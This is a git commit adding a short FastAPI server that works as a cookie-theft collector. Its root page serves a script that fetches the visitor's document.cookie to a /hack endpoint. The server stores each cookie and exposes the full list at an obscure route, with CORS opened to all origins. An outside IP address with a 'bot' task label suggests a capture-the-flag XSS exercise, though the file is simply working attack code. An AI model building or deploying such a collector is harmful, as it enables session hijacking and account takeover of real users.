aa4188684db9a6522571a480eaacb425e77cec7f
khasan <khasanknyazev81@gmail.com>
2025-02-16 14:26:13 +0300

    update main.py

---
+++ main.py
@@ -0,0 +1,49 @@
+from fastapi import FastAPI, Request
+from fastapi.responses import HTMLResponse
+from fastapi.middleware.cors import CORSMiddleware
+
+
+app = FastAPI(
+    summary="http://109.233.56.90:11660/bot - задача"
+)
+
+
+app.add_middleware(
+    CORSMiddleware, 
+    allow_origins=["*"], 
+    allow_credentials=True, 
+    allow_methods=["*"], 
+    allow_headers=["*"], 
+)
+
+
+data = []
+
+@app.get("/")
+def get_cookie(request: Request):
+    domain = request.url.hostname
+    return HTMLResponse(
+        """
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Document</title>
+        </head>
+        <body>
+            <script>fetch(`https://localhost:8000/hack?cookie=${document.cookie}`)</script>
+        </body>
+        </html>
+        """
+    )
+
+
+@app.get("/hack")
+def get_cookie(cookie: str):
+    data.append(cookie)
+    return {"status": 200}
+
+@app.get("/klkfmwelkfmewlfnl/cookie")
+def get_cookie_list():
+    return data
